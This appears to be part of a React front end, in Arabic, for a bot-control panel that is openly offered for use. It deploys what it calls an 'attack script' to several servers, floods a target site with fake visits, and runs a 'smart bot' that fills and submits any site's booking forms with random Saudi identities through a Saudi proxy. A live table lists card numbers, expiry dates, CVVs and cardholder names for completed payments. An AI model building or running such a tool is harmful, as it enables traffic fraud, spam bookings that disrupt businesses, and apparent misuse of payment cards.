                  {phase === 'scanning' ? '🔍 يفحص الموقع...' : phase === 'starting' ? '🚀 يبدأ...' : '▶️ بدء'}
                </button>
              )}
              {phase === 'running' && (
                <>
                  <div style={{ textAlign:'center', padding:'14px', backgroundColor:'#052e16', borderRadius:'8px', border:'1px solid #22c55e' }}>
                    <div style={{ fontSize:'18px', fontWeight:'bold', color:'#22c55e' }}>⚡ شغال</div>
                  </div>
                  <button onClick={handleStop} disabled={loading} style={{...st.btn('#dc2626'), opacity: loading ? 0.5 : 1, padding:'18px', fontSize:'16px'}}>
                    {activeAction === 'stop' ? '⏳ يوقف...' : '⏹️ إيقاف'}
                  </button>
                </>
              )}
            </div>

            {/* Countdown */}
            {remainingSeconds !== null && (
              <div style={{ textAlign:'center', padding:'10px', marginBottom:'12px', backgroundColor: remainingSeconds === 0 ? '#052e16' : '#1a1a2e', border:`1px solid ${remainingSeconds === 0 ? '#22c55e' : '#facc15'}`, borderRadius:'8px' }}>
                <div style={{ fontSize:'22px', fontWeight:'bold', color: remainingSeconds === 0 ? '#22c55e' : '#facc15' }}>
                  {remainingSeconds === 0 ? '✅ انتهى!' : `⏳ ${formatDuration(remainingSeconds)}`}
                </div>
              </div>
            )}

            {/* Stats Preview */}
            {(phase === 'running' || phase === 'finished') && (
              <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'8px', marginBottom:'14px', padding:'10px', backgroundColor:'#0a1628', borderRadius:'8px', border:'1px solid #1e3a5f' }}>
                <div style={{ textAlign:'center' }}>
                  <div style={{ fontSize:'18px', fontWeight:'bold', color:'#06b6d4' }}>{totalVisitsEstimate.toLocaleString()}</div>
                  <div style={{ fontSize:'9px', color:'#6b7280' }}>إجمالي الزيارات</div>
                </div>
                <div style={{ textAlign:'center' }}>
                  <div style={{ fontSize:'18px', fontWeight:'bold', color:'#22c55e' }}>👥 {totalActiveVisitors || activeVisitorsEstimate}</div>
                  <div style={{ fontSize:'9px', color:'#6b7280' }}>زائر نشط</div>
                </div>
                <div style={{ textAlign:'center' }}>
                  <div style={{ fontSize:'18px', fontWeight:'bold', color:'#facc15' }}>🌊 {totalWaves * servers.length}</div>
                  <div style={{ fontSize:'9px', color:'#6b7280' }}>إجمالي الموجات</div>
                </div>
                <div style={{ textAlign:'center' }}>
                  <div style={{ fontSize:'18px', fontWeight:'bold', color:'#a855f7' }}>{stayTime}s</div>
                  <div style={{ fontSize:'9px', color:'#6b7280' }}>مدة بقاء الزائر</div>
                </div>
              </div>
            )}

            {/* Live Monitoring */}
            {(serverStatus.length > 0 || monitoring) && (
              <div style={{ marginTop:'10px', border:'1px solid #14532d', borderRadius:'8px', padding:'14px', backgroundColor:'#0a0a0a' }}>
                <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'12px' }}>
                  <span style={{ fontSize:'14px', color:'#22c55e' }}>📡 المراقبة الحية</span>
                  <div style={{ display:'flex', gap:'6px' }}>
                    {!monitoring && <button onClick={startMonitoring} style={{ fontSize:'11px', color:'#22c55e', cursor:'pointer', background:'none', border:'1px solid #22c55e', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>▶</button>}
                    {monitoring && <button onClick={stopMonitoring} style={{ fontSize:'11px', color:'#ef4444', cursor:'pointer', background:'none', border:'1px solid #ef4444', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>⏹</button>}
                    <button onClick={fetchStatus} style={{ fontSize:'11px', color:'#6b7280', cursor:'pointer', background:'none', border:'1px solid #374151', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>🔄</button>
                  </div>
                </div>

                {serverStatus.map((sv, i) => (
                  <div key={i} style={st.card}>
                    <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'10px' }}>
                      <span style={{ fontSize:'13px', color:'#9ca3af' }}>🖥️ {sv.host}</span>
                      <span style={st.badge(getStatusColor(sv.status))}>{getStatusText(sv.status)}</span>
                    </div>
                    {sv.status !== 'offline' && sv.status !== 'idle' && (
                      <>
                        <div style={{ display:'grid', gridTemplateColumns:'repeat(4, 1fr)', gap:'6px', marginBottom:'8px' }}>
                          {[
                            { v: (sv.visits||0).toLocaleString(), l:'زيارات', c:'#fff' },
                            { v: (sv.target||0).toLocaleString(), l:'الهدف', c:'#fff' },
                            { v: formatTime(sv.elapsed||0), l:'الوقت', c:'#4ade80' },
                            { v: sv.errors||0, l:'أخطاء', c: (sv.errors||0) > 0 ? '#ef4444' : '#22c55e' },
                          ].map((x, j) => (
                            <div key={j} style={{ textAlign:'center', padding:'6px', backgroundColor:'#000', borderRadius:'6px', border:'1px solid #1f2937' }}>
                              <div style={{ fontSize:'16px', fontWeight:'bold', color:x.c }}>{x.v}</div>
                              <div style={{ fontSize:'9px', color:'#6b7280' }}>{x.l}</div>
                            </div>
                          ))}
                        </div>
                        <div style={{ width:'100%', height:'6px', backgroundColor:'#1f2937', borderRadius:'4px', overflow:'hidden' }}>
                          <div style={{ height:'100%', borderRadius:'4px', width:`${sv.progress||0}%`, backgroundColor: sv.status === 'finished' ? '#3b82f6' : '#22c55e', transition:'width 0.5s' }}></div>
                        </div>
                      </>
                    )}
                  </div>
                ))}
              </div>
            )}
          </>
        )}

        {/* ===== SMART BOT MODE ===== */}
        {mode === 'smart' && (
          <>
            {/* Phase indicator */}
            <div style={{ textAlign:'center', marginBottom:'16px', padding:'12px', backgroundColor:'#1a0a00', borderRadius:'8px', border:`1px solid ${sesPhaseColor[sesPhase]}` }}>
              <span style={{ fontSize:'16px', color: sesPhaseColor[sesPhase], fontWeight:'bold' }}>{sesPhaseText[sesPhase]}</span>
              {sesPhase === 'running' && <span style={{ fontSize:'12px', color:'#9ca3af', marginRight:'10px' }}> | 🖥️ {servers.length} سيرفرات | 🧠 {parseInt(sesInstances) * servers.length} متصفح</span>}
            </div>

            {/* Target URL */}
            <div style={{ marginBottom:'16px', padding:'14px', backgroundColor:'#1a0a00', borderRadius:'8px', border:'1px solid #f97316' }}>
              <div style={{ textAlign:'center', marginBottom:'10px' }}>
                <span style={{ fontSize:'18px', color:'#f97316', fontWeight:'bold' }}>🧠 بوت ذكي - أي موقع</span>
              </div>
              <div style={{ fontSize:'12px', color:'#fb923c', textAlign:'center', marginBottom:'12px' }}>
                يكتشف الحقول تلقائياً ويعبيها ببيانات سعودية عشوائية على أي موقع
              </div>
              <div>
                <label style={{...st.label, color:'#f97316'}}>🔗 رابط الموقع المستهدف</label>
                <input type="text" value={smartUrl} onChange={(e) => setSmartUrl(e.target.value)} placeholder="https://example.com/booking" style={{...st.input, fontSize:'15px', padding:'12px', borderColor:'#f97316'}} disabled={sesPhase === 'running'} />
              </div>
            </div>

            {/* Settings */}
            <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'12px', marginBottom:'16px' }}>
              <div>
                <label style={{...st.label, color:'#f97316'}}>⏱️ المدة (دقائق)</label>
                <input type="number" value={sesDuration} onChange={(e) => setSesDuration(e.target.value)} min="1" style={{...st.input, textAlign:'center', fontSize:'16px', borderColor:'#f97316'}} disabled={sesPhase === 'running'} />
              </div>
              <div>
                <label style={{...st.label, color:'#f97316'}}>🌐 متصفحات لكل سيرفر</label>
                <input type="number" value={sesInstances} onChange={(e) => setSesInstances(e.target.value)} min="1" max="10" style={{...st.input, textAlign:'center', fontSize:'16px', borderColor:'#f97316'}} disabled={sesPhase === 'running'} />
              </div>
            </div>

            {/* Estimated stats */}
            <div style={{ display:'grid', gridTemplateColumns:'repeat(3, 1fr)', gap:'8px', marginBottom:'16px' }}>
              <div style={{ textAlign:'center', padding:'12px', backgroundColor:'#1a0a00', borderRadius:'8px', border:'1px solid #92400e' }}>
                <div style={{ fontSize:'20px', fontWeight:'bold', color:'#f97316' }}>🖥️ {servers.length}</div>
                <div style={{ fontSize:'10px', color:'#92400e' }}>سيرفرات</div>
              </div>
              <div style={{ textAlign:'center', padding:'12px', backgroundColor:'#1a0a00', borderRadius:'8px', border:'1px solid #92400e' }}>
                <div style={{ fontSize:'20px', fontWeight:'bold', color:'#fb923c' }}>🌐 {parseInt(sesInstances || 3) * servers.length}</div>
                <div style={{ fontSize:'10px', color:'#92400e' }}>متصفح متزامن</div>
              </div>
              <div style={{ textAlign:'center', padding:'12px', backgroundColor:'#1a0a00', borderRadius:'8px', border:'1px solid #92400e' }}>
                <div style={{ fontSize:'20px', fontWeight:'bold', color:'#fbbf24' }}>⏱️ {sesDuration}د</div>
                <div style={{ fontSize:'10px', color:'#92400e' }}>المدة</div>
              </div>
            </div>

            {/* Proxy */}
            <div style={{ marginBottom:'14px', border:'1px solid #92400e', borderRadius:'8px', padding:'14px', backgroundColor:'#1a0a00' }}>
              <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:'10px' }}>
                <div style={{ display:'flex', alignItems:'center', gap:'8px' }}>
                  <span style={{ fontSize:'13px', color:'#f97316' }}>🌐 بروكسي سعودي</span>
                  <button onClick={() => setUseProxy(!useProxy)} style={{ background: useProxy ? '#f97316' : '#374151', color:'#fff', border:'none', padding:'3px 14px', borderRadius:'12px', cursor:'pointer', fontSize:'11px', fontFamily:ff }}>
                    {useProxy ? '✅ مفعّل' : '❌ معطّل'}
                  </button>
                </div>
                {useProxy && proxyStatus === 'active' && <span style={{ background:'#052e16', color:'#4ade80', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #22c55e' }}>✅ شغال</span>}
              </div>
              {useProxy && (
                <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'8px' }}>
                  <div>
                    <label style={{ fontSize:'11px', color:'#92400e', marginBottom:'4px', display:'block' }}>Username</label>
                    <input type="text" value={proxyUser} onChange={(e) => setProxyUser(e.target.value)} style={{...st.input, borderColor:'#92400e'}} />
                  </div>
                  <div>
                    <label style={{ fontSize:'11px', color:'#92400e', marginBottom:'4px', display:'block' }}>Password</label>
                    <input type="text" value={proxyPass} onChange={(e) => setProxyPass(e.target.value)} style={{...st.input, borderColor:'#92400e'}} />
                  </div>
                </div>
              )}
            </div>

            {/* Start / Stop */}
            <div style={{ display:'grid', gridTemplateColumns: sesPhase === 'running' ? '1fr 1fr' : '1fr', gap:'10px', marginBottom:'16px' }}>
              {sesPhase !== 'running' && (
                <button onClick={handleStartSes} disabled={loading || sesPhase === 'deploying'} style={{...st.btn('#ea580c'), opacity: loading ? 0.5 : 1, padding:'18px', fontSize:'18px'}}>
                  {sesPhase === 'deploying' ? '📤 يرفع البوت...' : '🧠 بدء البوت الذكي'}
                </button>
              )}
              {sesPhase === 'running' && (
                <>
                  <div style={{ textAlign:'center', padding:'14px', backgroundColor:'#451a03', borderRadius:'8px', border:'1px solid #f97316' }}>
                    <div style={{ fontSize:'18px', fontWeight:'bold', color:'#f97316' }}>🧠 البوت شغال...</div>
                  </div>
                  <button onClick={handleStopSes} disabled={loading} style={{...st.btn('#dc2626'), opacity: loading ? 0.5 : 1, padding:'18px', fontSize:'16px'}}>
                    ⏹️ إيقاف
                  </button>
                </>
              )}
            </div>

            {/* Countdown */}
            {sesRemaining !== null && (
              <div style={{ textAlign:'center', padding:'10px', marginBottom:'12px', backgroundColor: sesRemaining === 0 ? '#052e16' : '#1a0a00', border:`1px solid ${sesRemaining === 0 ? '#22c55e' : '#f97316'}`, borderRadius:'8px' }}>
                <div style={{ fontSize:'22px', fontWeight:'bold', color: sesRemaining === 0 ? '#22c55e' : '#f97316' }}>
                  {sesRemaining === 0 ? '✅ انتهى!' : `⏳ ${formatDuration(sesRemaining)}`}
                </div>
              </div>
            )}

            {/* Live Stats */}
            {sesStatus.length > 0 && (
              <div style={{ marginTop:'10px', border:'1px solid #92400e', borderRadius:'8px', padding:'14px', backgroundColor:'#1a0a00' }}>
                <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'12px' }}>
                  <span style={{ fontSize:'14px', color:'#f97316' }}>📡 المراقبة الحية</span>
                  <button onClick={fetchSesStatus} style={{ fontSize:'11px', color:'#92400e', cursor:'pointer', background:'none', border:'1px solid #92400e', padding:'3px 10px', borderRadius:'4px', fontFamily:ff }}>🔄</button>
                </div>

                {/* Total Stats */}
                <div style={{ display:'grid', gridTemplateColumns:'repeat(3, 1fr)', gap:'8px', marginBottom:'12px' }}>
                  <div style={{ textAlign:'center', padding:'14px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #22c55e' }}>
                    <div style={{ fontSize:'28px', fontWeight:'bold', color:'#22c55e' }}>📋 {totalSesBookings}</div>
                    <div style={{ fontSize:'11px', color:'#4ade80' }}>حجوزات ناجحة</div>
                  </div>
                  <div style={{ textAlign:'center', padding:'14px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #ef4444' }}>
                    <div style={{ fontSize:'28px', fontWeight:'bold', color:'#ef4444' }}>❌ {totalSesErrors}</div>
                    <div style={{ fontSize:'11px', color:'#fca5a5' }}>أخطاء</div>
                  </div>
                  <div style={{ textAlign:'center', padding:'14px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #06b6d4' }}>
                    <div style={{ fontSize:'28px', fontWeight:'bold', color:'#06b6d4' }}>🖥️ {sesStatus.filter(s => s.status === 'running').length}</div>
                    <div style={{ fontSize:'11px', color:'#67e8f9' }}>سيرفرات نشطة</div>
                  </div>
                </div>

                {/* Per-server */}
                {sesStatus.map((sv, i) => (
                  <div key={i} style={{...st.card, borderColor:'#92400e'}}>
                    <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center' }}>
                      <span style={{ fontSize:'13px', color:'#9ca3af' }}>🖥️ {sv.host}</span>
                      <div style={{ display:'flex', gap:'8px', alignItems:'center' }}>
                        <span style={{ fontSize:'12px', color:'#22c55e' }}>📋 {sv.bookings || 0}</span>
                        <span style={{ fontSize:'12px', color:'#ef4444' }}>❌ {sv.errors || 0}</span>
                        <span style={st.badge(sv.status === 'running' ? '#f97316' : sv.status === 'stopped' ? '#6b7280' : '#ef4444')}>
                          {sv.status === 'running' ? '🟠 شغال' : sv.status === 'stopped' ? '⚪ توقف' : '🔴 خطأ'}
                        </span>
                      </div>
                    </div>
                  </div>
                ))}

                {/* Recent Entries Table */}
                {sesRecent.length > 0 && (
                  <div style={{ marginTop:'12px', border:'1px solid #f97316', borderRadius:'8px', overflow:'hidden' }}>
                    <div style={{ padding:'10px 14px', backgroundColor:'#431407', borderBottom:'1px solid #f97316' }}>
                      <span style={{ fontSize:'14px', color:'#fb923c', fontWeight:'bold' }}>📋 آخر التسجيلات ({sesRecent.length})</span>
                    </div>
                    <div style={{ maxHeight:'300px', overflowY:'auto' }}>
                      <table style={{ width:'100%', borderCollapse:'collapse', fontSize:'11px', fontFamily:ff }}>
                        <thead>
                          <tr style={{ backgroundColor:'#1a0a00' }}>
                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>#</th>
                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الوقت</th>
                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الاسم</th>
                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الهوية</th>
                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الجوال</th>
                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>💳 رقم البطاقة</th>
                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>الانتهاء</th>
                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>CVV</th>
                            <th style={{ padding:'8px 6px', color:'#ef4444', textAlign:'right', borderBottom:'1px solid #92400e' }}>حامل البطاقة</th>
                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>الحالة</th>
                            <th style={{ padding:'8px 6px', color:'#f97316', textAlign:'right', borderBottom:'1px solid #92400e' }}>السيرفر</th>
                          </tr>
                        </thead>
                        <tbody>
                          {sesRecent.map((entry, idx) => (
                            <tr key={idx} style={{ backgroundColor: idx % 2 === 0 ? '#0a0500' : '#1a0a00', borderBottom:'1px solid #1f1005' }}>
                              <td style={{ padding:'6px', color:'#22c55e', textAlign:'right' }}>{entry.id}</td>
                              <td style={{ padding:'6px', color:'#9ca3af', textAlign:'right' }}>{entry.time}</td>
                              <td style={{ padding:'6px', color:'#fff', textAlign:'right', fontWeight:'bold' }}>{entry.name}</td>
                              <td style={{ padding:'6px', color:'#06b6d4', textAlign:'right', direction:'ltr' }}>{entry.national_id}</td>
                              <td style={{ padding:'6px', color:'#facc15', textAlign:'right', direction:'ltr' }}>{entry.phone}</td>
                              <td style={{ padding:'6px', color: entry.card_number ? '#ef4444' : '#374151', textAlign:'right', direction:'ltr', fontWeight: entry.card_number ? 'bold' : 'normal' }}>{entry.card_number || '-'}</td>
                              <td style={{ padding:'6px', color: entry.card_expiry ? '#ef4444' : '#374151', textAlign:'right', direction:'ltr' }}>{entry.card_expiry || '-'}</td>
                              <td style={{ padding:'6px', color: entry.card_cvv ? '#ef4444' : '#374151', textAlign:'right', direction:'ltr' }}>{entry.card_cvv || '-'}</td>
                              <td style={{ padding:'6px', color: entry.card_holder ? '#ef4444' : '#374151', textAlign:'right' }}>{entry.card_holder || '-'}</td>
                              <td style={{ padding:'6px', textAlign:'right' }}><span style={{ padding:'2px 6px', borderRadius:'4px', fontSize:'10px', backgroundColor: entry.status === 'payment_done' ? '#052e16' : entry.status === 'payment_selected' ? '#1e1b4b' : '#1a0a00', color: entry.status === 'payment_done' ? '#22c55e' : entry.status === 'payment_selected' ? '#818cf8' : '#f97316', border: `1px solid ${entry.status === 'payment_done' ? '#16a34a' : entry.status === 'payment_selected' ? '#6366f1' : '#92400e'}` }}>{entry.status === 'payment_done' ? '✅ تم الدفع' : entry.status === 'payment_selected' ? '💳 جاري الدفع' : entry.status === 'page1_done' ? '📝 صفحة 1' : entry.status || '-'}</span></td>
                              <td style={{ padding:'6px', color:'#6b7280', textAlign:'right', fontSize:'10px' }}>{entry.server?.split('.').pop()}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Info box */}
            <div style={{ marginTop:'14px', padding:'14px', backgroundColor:'#1a0a00', borderRadius:'8px', border:'1px solid #92400e' }}>
              <div style={{ fontSize:'13px', color:'#f97316', marginBottom:'8px', fontWeight:'bold' }}>🧠 كيف يشتغل البوت الذكي؟</div>
              <div style={{ fontSize:'12px', color:'#fb923c', lineHeight:'1.8' }}>
                1. يفتح أي رابط تحطه بمتصفح Chrome حقيقي<br/>
                2. يكتشف كل حقول الفورم تلقائياً (اسم، هوية، جوال، إيميل، إلخ)<br/>
                3. يعبي كل حقل بالبيانات المناسبة (أسماء سعودية، أرقام هوية، جوالات 05xx)<br/>
                4. يختار من القوائم المنسدلة عشوائياً<br/>
                5. يفعّل الخيارات (checkboxes, radio buttons)<br/>
                6. يضغط زر الإرسال/التالي تلقائياً<br/>
                7. إذا في صفحة ثانية - يعبيها كمان<br/>
                8. يكرر العملية ببيانات جديدة كل مرة<br/>
                9. يشتغل عبر بروكسي سعودي كزائر حقيقي
              </div>
            </div>
          </>
        )}

        {/* ===== ADVANCED SETTINGS ===== */}
        <div style={{ marginTop:'16px' }}>
          <button onClick={() => setShowAdvanced(!showAdvanced)} style={{ display:'flex', alignItems:'center', gap:'6px', fontSize:'13px', color:'#6b7280', cursor:'pointer', background:'none', border:'1px solid #374151', padding:'8px 16px', borderRadius:'8px', fontFamily:ff, width:'100%', justifyContent:'center' }}>
            ⚙️ إعدادات متقدمة {showAdvanced ? '▲' : '▼'}
          </button>

          {showAdvanced && (
            <div style={{ marginTop:'12px', border:'1px solid #374151', borderRadius:'8px', padding:'16px', backgroundColor:'#0a0a0a' }}>
              {/* API Key */}
              <div style={{ marginBottom:'14px' }}>
                <div style={{ display:'flex', alignItems:'center', gap:'8px', marginBottom:'6px' }}>
                  <label style={{ fontSize:'13px', color:'#ef4444' }}>🔑 مفتاح الدخول</label>
                  <span style={{ fontSize:'11px', color: panelApiKey ? '#22c55e' : '#ef4444' }}>{panelApiKey ? '✅' : '❌ مطلوب'}</span>
                </div>
                <div style={{ position:'relative' }}>
                  <input type={showApiKey ? 'text' : 'password'} value={panelApiKey} onChange={(e) => setPanelApiKey(e.target.value)} placeholder="API Key..." style={{...st.input, borderColor: panelApiKey ? '#22c55e' : '#ef4444', paddingLeft:'36px'}} />
                  <button onClick={() => setShowApiKey(!showApiKey)} style={{ position:'absolute', left:'8px', top:'50%', transform:'translateY(-50%)', background:'none', border:'none', cursor:'pointer', fontSize:'18px', padding:'0', lineHeight:'1' }}>{showApiKey ? '🙈' : '👁️'}</button>
                </div>
              </div>

              {/* Wave & Stay */}
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px', marginBottom:'14px' }}>
                <div>
                  <label style={st.label}>🌊 حجم الموجة</label>
                  <input type="number" value={waveSize} onChange={(e) => setWaveSize(e.target.value)} min="10" max="500" style={{...st.input, textAlign:'center'}} />
                </div>
                <div>
                  <label style={st.label}>⏳ مدة البقاء (ثانية)</label>
                  <input type="number" value={stayTime} onChange={(e) => setStayTime(e.target.value)} min="10" max="120" style={{...st.input, textAlign:'center'}} />
                </div>
              </div>

              {/* Servers */}
              <div style={{ marginBottom:'14px' }}>
                <button onClick={() => setShowServerPanel(!showServerPanel)} style={{ display:'flex', alignItems:'center', gap:'6px', fontSize:'13px', color:'#facc15', cursor:'pointer', background:'none', border:'none', fontFamily:ff }}>
                  🖥️ السيرفرات ({servers.length}) {showServerPanel ? '▲' : '▼'}
                </button>
                {showServerPanel && (
                  <div style={{ border:'1px solid #14532d', borderRadius:'8px', padding:'12px', marginTop:'8px', backgroundColor:'#000' }}>
                    {servers.map((sv, i) => (
                      <div key={i} style={{ display:'flex', alignItems:'center', justifyContent:'space-between', backgroundColor:'#111827', padding:'6px 10px', borderRadius:'6px', fontSize:'13px', color:'#4ade80', marginBottom:'6px' }}>
                        <span>🖥️ {sv.host}</span>
                        <button onClick={() => removeServer(sv.host)} style={{ color:'#ef4444', cursor:'pointer', background:'none', border:'none', fontSize:'14px' }}>🗑️</button>
                      </div>
                    ))}
                    <div style={{ display:'flex', gap:'6px', marginTop:'8px' }}>
                      <input type="text" value={newHost} onChange={(e) => setNewHost(e.target.value)} placeholder="IP" style={{...st.input, flex:1}} />
                      <button onClick={addServer} style={st.btn('#14532d')}>+ إضافة</button>
                    </div>
                  </div>
                )}
              </div>

              {/* Setup & Deploy */}
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px' }}>
                <button onClick={handleSetup} disabled={loading} style={{...st.btn('#581c87'), opacity: loading ? 0.5 : 1}}>⚙️ تجهيز السيرفرات</button>
                <button onClick={handleDeploy} disabled={loading} style={{...st.btn('#1e3a5f'), opacity: loading ? 0.5 : 1}}>📤 رفع سكريبت الهجوم</button>
              </div>
            </div>
          )}
        </div>

        {/* Logs */}
        <div style={{ marginTop:'16px' }}>
          <div style={{ display:'flex', justifyContent:'space-between', marginBottom:'6px' }}>
            <span style={{ fontSize:'13px', color:'#9ca3af' }}>💻 سجل النظام</span>
            <button onClick={() => setLogs([])} style={{ fontSize:'11px', color:'#6b7280', cursor:'pointer', background:'none', border:'none', fontFamily:ff }}>مسح</button>
          </div>
          <div style={{ backgroundColor:'#000', border:'1px solid #14532d', height:'180px', overflowY:'auto', padding:'12px', borderRadius:'6px', fontSize:'11px', fontFamily:ff }}>
            {logs.length === 0 ? <span style={{ color:'#4b5563' }}>بانتظار الأوامر...</span> : logs.map((log, i) => (
              <div key={i} style={{ marginBottom:'3px', borderBottom:'1px solid #111827', paddingBottom:'3px' }}>{log}</div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
